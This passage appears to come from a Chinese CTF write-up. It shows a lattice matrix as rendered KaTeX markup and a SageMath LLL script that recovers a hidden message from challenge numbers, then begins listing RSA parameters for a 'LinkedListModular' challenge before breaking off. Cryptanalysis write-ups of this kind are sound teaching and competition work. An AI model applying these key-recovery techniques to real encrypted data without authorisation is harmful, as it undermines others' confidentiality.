rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mi>n</mi></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>K</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mi mathvariant="normal">/</mi><mi>p</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>K</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mstyle></mrow><annotation encoding="application/x-tex">\small \begin{pmatrix}l_1 &amp; l_2 &amp; \dots &amp; l_n &amp; m &amp; -1\end{pmatrix}\begin{pmatrix}p &amp; 0 &amp; \dots &amp; 0 &amp; 0 &amp; 0 \\0 &amp; p &amp; \dots &amp; 0 &amp; 0 &amp; 0 \\\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \vdots \\0 &amp; 0 &amp; \dots &amp; p &amp; 0 &amp; 0 \\a_1 &amp; a_2 &amp; \dots &amp; a_n &amp; K/p &amp; 0 \\c_1 &amp; c_2 &amp; \dots &amp; c_n &amp; 0 &amp; K\end{pmatrix}=\begin{pmatrix}b &amp; b &amp; b &amp; \dots &amp; K/p &amp; -K\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.224em;vertical-align:-3.387em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6 delimcenter" style="top:0.025em;">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:-0.0197em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6 delimcenter" style="top:0.025em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.825em;"><span style="top:-5.8249em;"><span class="pstrut" style="height:9.2em;"></span><span style="width:0.875em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="7.200em" viewBox="0 0 875 7200"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,3684c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-3692c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.375em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2796em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.09em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-5.89em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.8633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-2.6633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-1.4633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-0.2633em;"><span class="pstrut" style="height:3.6667em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.137em;"><span style="top:-2.45em;margin-left:0em;margin-right:0.0556em;"><span class="pstrut" style="height:2.6em;"></span><span class="sizing reset-size5 size2 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.825em;"><span style="top:-5.8249em;"><span class="pstrut" style="height:9.2em;"></span><span style="width:0.875em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="7.200em" viewBox="0 0 875 7200"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,3609c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-3744c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.375em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel sizing reset-size6 size5">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.08em;vertical-align:-0.315em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6 delimcenter" style="top:0.025em;">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6 delimcenter" style="top:0.025em;">)</span></span></span></span></span></span></p><p>为了使右列向量的比特位相同，b=getPrime(400), 且b &lt; K, 显然K得取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>400</mn></msup></mrow><annotation encoding="application/x-tex">2^{400}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">400</span></span></span></span></span></span></span></span></span></span></span></span>。<br>然后就继续愉快的套公式吧~</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line">c = [</span><br><span class="line"></span><br><span class="line">    <span class="number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>,</span><br><span class="line">    <span class="number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>,</span><br><span class="line">    <span class="number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>,</span><br><span class="line">    <span class="number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>,</span><br><span class="line">    <span class="number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">a = [</span><br><span class="line"></span><br><span class="line">    <span class="number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>,</span><br><span class="line">    <span class="number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>,</span><br><span class="line">    <span class="number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>,</span><br><span class="line">    <span class="number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>,</span><br><span class="line">    <span class="number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line"></span><br><span class="line">M = Matrix(QQ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"></span><br><span class="line">    M[i, i] = p</span><br><span class="line">    M[-<span class="number">2</span>, i] = a[i]</span><br><span class="line">    M[-<span class="number">1</span>, i] = -c[i]</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span> ^ <span class="number">400</span></span><br><span class="line">t = K / p</span><br><span class="line"></span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">2</span>] = t</span><br><span class="line">M[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">L = M. LLL()</span><br><span class="line"></span><br><span class="line">x = L[<span class="number">1</span>][-<span class="number">2</span>] // t</span><br><span class="line">m = x % p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(m).bit_length())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/hnp.png" alt=""></p><h2 id="LinkedListModular">LinkedListModular</h2><p>逆向部分我不会，主要说我的逆向队友爆出来的部分：</p><pre><code>p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b e:0xd322 c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ffp:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 e:0x10ae c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 